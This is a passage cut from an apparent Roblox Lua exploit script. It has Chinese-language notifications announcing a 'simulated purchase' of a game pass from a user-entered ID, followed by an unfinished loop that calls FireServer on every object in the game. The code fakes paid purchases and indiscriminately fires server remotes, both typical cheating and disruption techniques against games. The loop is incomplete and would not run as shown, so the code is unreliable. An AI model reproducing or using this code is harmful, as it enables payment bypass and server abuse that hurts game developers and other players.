            tonumber(gpIdInput),
            true
        )
        _G.NotifySuccess("成功", "已模拟购买通行证 (ID: " .. gpIdInput .. ")", 2)
    else
        _G.NotifyError("错误", "请输入有效的数字ID", 2)
    end

for _,v in pairs(game:GetDescendants()) do

v:FireServer()
